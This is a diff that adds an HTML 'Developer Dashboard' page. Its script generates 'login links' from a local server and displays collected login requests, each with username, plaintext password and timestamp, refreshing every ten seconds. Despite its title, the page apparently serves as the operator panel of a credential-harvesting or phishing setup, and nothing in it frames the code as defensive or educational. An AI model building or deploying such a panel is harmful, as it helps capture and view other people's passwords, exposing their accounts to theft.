@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Developer Dashboard</title>
+  <style>
+    body { font-family: Arial, sans-serif; }
+    #logins { margin-top: 20px; }
+    .login-section { border: 1px solid #ccc; padding: 10px; margin-bottom: 10px; }
+    .login-section h3 { margin-top: 0; }
+  </style>
+</head>
+<body>
+  <h1>Developer Dashboard</h1>
+  <button id="generateBtn">Generate Login Link</button>
+  <button id="refreshBtn">Refresh Login Requests</button>
+
+  <div id="generatedLink"></div>
+  <div id="logins"></div>
+
+  <script>
+    // Update this variable if your server runs on a different host/port.
+    const serverBaseUrl = 'http://localhost:3000';
+
+    // Function to generate a new login link.
+    function generateLoginLink() {
+      fetch(serverBaseUrl + '/generate-login')
+        .then(response => response.json())
+        .then(data => {
+          const div = document.getElementById('generatedLink');
+          div.innerHTML = `<p>New Login Link: <a href="${data.loginUrl}" target="_blank">${data.loginUrl}</a></p>`;
+        })
+        .catch(err => {
+          alert('Error generating login link: ' + err);
+        });
+    }
+
+    // Function to fetch and display all login requests.
+    function fetchLoginRequests() {
+      fetch(serverBaseUrl + '/get-login-requests')
+        .then(response => response.json())
+        .then(data => {
+          const loginsDiv = document.getElementById('logins');
+          loginsDiv.innerHTML = ''; // Clear previous contents
+
+          // For each login API token, list its requests.
+          for (const token in data) {
+            const section = document.createElement('div');
+            section.classList.add('login-section');
+            section.innerHTML = `<h3>Token: ${token}</h3>`;
+            if (data[token].requests.length === 0) {
+              section.innerHTML += '<p>No login requests yet.</p>';
+            } else {
+              const list = document.createElement('ul');
+              data[token].requests.forEach(req => {
+                const item = document.createElement('li');
+                item.textContent = `Username: ${req.username}, Password: ${req.password}, Time: ${new Date(req.timestamp).toLocaleString()}`;
+                list.appendChild(item);
+              });
+              section.appendChild(list);
+            }
+            loginsDiv.appendChild(section);
+          }
+        })
+        .catch(err => {
+          alert('Error fetching login requests: ' + err);
+        });
+    }
+
+    // Event listeners.
+    document.getElementById('generateBtn').addEventListener('click', generateLoginLink);
+    document.getElementById('refreshBtn').addEventListener('click', fetchLoginRequests);
+
+    // Optionally, auto-refresh login requests every 10 seconds.
+    setInterval(fetchLoginRequests, 10000);
+  </script>
+</body>
+</html>
